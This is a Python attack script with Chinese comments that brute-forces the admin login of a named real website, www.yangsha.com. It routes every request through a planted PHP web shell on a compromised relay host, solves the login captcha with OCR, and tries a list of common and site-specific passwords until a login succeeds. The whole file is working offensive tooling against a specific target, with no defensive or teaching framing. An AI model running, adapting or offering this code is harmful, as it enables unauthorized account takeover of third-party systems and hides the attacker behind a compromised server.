#!/usr/bin/env python3
"""yangsha_bf.py - yangsha.com ASP后台爆破(验证码OCR via 81.70跳板)
流程: 81.70下载/GetCode.asp验证码 -> 165 ddddocr识别 -> 81.70 POST登录
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io, http.cookiejar
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
SHELL = 'http://127.0.0.1:13080/theme_check.php'
BASE = 'http://www.yangsha.com'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "yangsha", "yangsha123", "yzdf", "123456789"]

def php_exec(code):
    try:
        req = urllib.request.Request(SHELL, data=urllib.parse.urlencode({'x': code}).encode(),
                                     headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded'})
        r = urllib.request.urlopen(req, timeout=25, context=ctx)
        return r.read(50000).decode('utf-8', 'ignore')
    except Exception as e:
        return 'ERR:' + repr(e)[:80]

def get_captcha():
    """81.70下载验证码, 返回base64"""
    code = ('$ch=curl_init("%s/GetCode.asp?t=".time());curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);'
            'curl_setopt($ch,CURLOPT_COOKIEJAR,"ys_c.txt");curl_setopt($ch,CURLOPT_COOKIEFILE,"ys_c.txt");'
            'curl_setopt($ch,CURLOPT_TIMEOUT,12);$r=curl_exec($ch);echo base64_encode($r);' % BASE)
    out = php_exec(code)
    if out.startswith('ERR') or len(out) < 50:
        return None
    try:
        import base64
        img = base64.b64decode(out.strip())
        return img
    except Exception:
        return None

def do_login(pw, code, cookie_jar):
    """81.70 POST登录"""
    data = 'username=admin&password=%s&Code=%s' % (pw, code)
    php = ('$ch=curl_init("%s/admin/login.asp?action=check");curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);'
           'curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,"%s");'
           'curl_setopt($ch,CURLOPT_COOKIEJAR,"%s");curl_setopt($ch,CURLOPT_COOKIEFILE,"%s");'
           'curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_TIMEOUT,12);'
           '$r=curl_exec($ch);echo $r;' % (BASE, data, cookie_jar, cookie_jar))
    return php_exec(php)

def main():
    ocr = ddddocr.DdddOcr(show_ad=False)
    ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)
    for pw in PASSWORDS:
        for attempt in range(6):
            img = get_captcha()
            if not img:
                print('captcha dl fail %s' % pw, flush=True)
                time.sleep(3)
                continue
            # OCR
            c1 = ocr.classification(img)
            try:
                im = Image.open(io.BytesIO(img)).convert('L')
                im = im.resize((im.width * 3, im.height * 3), Image.LANCZOS)
                im = im.point(lambda p: 255 if p > 130 else 0)
                buf = io.BytesIO(); im.save(buf, 'PNG')
                c2 = ocrb.classification(buf.getvalue())
            except Exception:
                c2 = c1
            code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
            # 提交
            resp = do_login(pw, code, 'ys_%d.txt' % attempt)
            if '验证码' in resp:
                continue  # 验证码错, 重取
            if '错误' in resp or '失败' in resp or '密码' in resp:
                print('pw-wrong %s' % pw, flush=True)
                time.sleep(2)
                break
            # 其他=可能成功
            if '管理' in resp or '欢迎' in resp or 'logout' in resp.lower() or 'index.asp' in resp:
                print('!!! HIT: admin/%s (resp=%s)' % (pw, resp[:100].replace(chr(10), ' ')), flush=True)
                sys.exit(0)
            print('CHECK %s: %s' % (pw, resp[:80].replace(chr(10), ' ')), flush=True)
            time.sleep(2)
            break
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
